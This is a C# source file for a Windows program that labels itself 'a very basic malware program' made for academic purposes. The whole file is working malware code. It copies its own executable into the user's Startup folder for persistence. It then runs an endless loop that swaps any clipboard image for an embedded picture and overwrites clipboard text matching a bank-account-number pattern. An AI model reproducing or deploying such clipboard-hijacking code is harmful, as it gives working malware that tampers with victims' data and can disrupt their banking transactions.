using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CopyPasteMal
{
    static class Program
    {
        /// <summary>
        /// A very basic malware program which will change things that are saved in your clipboard. 
        /// Done only for Academic purposes 
        /// </summary>
        /// 


        [STAThread]
        static void Main()
        {
            //on startup program will copy itself to the startup folder
            try { 
                String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName));
            }
            catch(Exception ex) //it'll catch an exception if file already exisits
            { }


            Image returnImage = null;
            Image replacementImage = Properties.Resources._0022___AnURDjc;
            string pattern = @"\d\d\s\d\d\d\d\s\d\d\d\d\s\d\d\d\d\s\d\d\d\d\s\d\d\d\d\s\d\d\d\d$"; //pattern of some bank acc numbers
                                                                                                   //it's a bit of an eye sore but well, happens 
            Regex exp = new Regex(pattern);
            string oryginalText = string.Empty;
            string wordSwap = ":^)";
            while (true)
            {
                if(Clipboard.ContainsImage())
                {
                    returnImage = Clipboard.GetImage();
                    Clipboard.SetImage(replacementImage);
                }
                if(Clipboard.ContainsText())
                {
                    oryginalText = Clipboard.GetText();
                    if (exp.Match(oryginalText).Success)
                        Clipboard.SetText(wordSwap);
                }
                System.Threading.Thread.Sleep(4000);
            }
        }
    }
}
